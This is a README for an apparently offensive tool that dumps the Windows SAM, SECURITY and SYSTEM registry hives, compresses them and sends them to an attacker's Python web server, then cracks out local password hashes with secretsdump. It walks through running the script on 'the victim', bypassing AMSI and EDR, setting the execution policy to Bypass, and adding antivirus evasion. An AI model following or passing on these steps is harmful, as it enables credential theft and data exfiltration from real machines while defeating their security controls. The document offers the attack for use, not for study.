# Powershell script for Windows local hashes extraction
This Powershell script saves SAM, SECURITY and SYSTEM hives in C:\Users\Public\, compress the files in an archive and send it to the POST Python Web server in this repo.    

Some EDRs can be bypassed by first bypassing AMSI and then launching the script. Regarding AVs, I have had poor results as it is more easily detected because it uses recognisable commands, but feel free to add some evasion techniques, such as changing the saved locations of the hives.

You (obviously) need admin or SYSTEM privileges to use it.

## How to use
1. Start the Python Web server `server.py` on your machine, you can choose the interface that will serve the web server and it will print the address to provide to the PowerShell script :
```bash
git clone https://github.com/thomsoe/local-hashes-extractor-ps1.git
cd local-hashes-extractor-ps1
python3 server.py
```
2. Copy the content of `exfiltrate.ps1` to a file on the victim :
```bash
cat exfiltrate.ps1 | xclip -sel clipboard
# Then paste it on the victim
```
3. On the victim's machine, bypass AMSI (use a technique from here : https://amsi.fail/) and execute the script `exfiltrate.ps1` :
```powershell
Set-ExecutionPolicy Bypass
"C:\path\to\exfiltrate_renamed.ps1"
```
## Extract and retrieve the hashes
On your machine, decompress and run secretsdump.py :
```bash
unzip loot.zip
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```
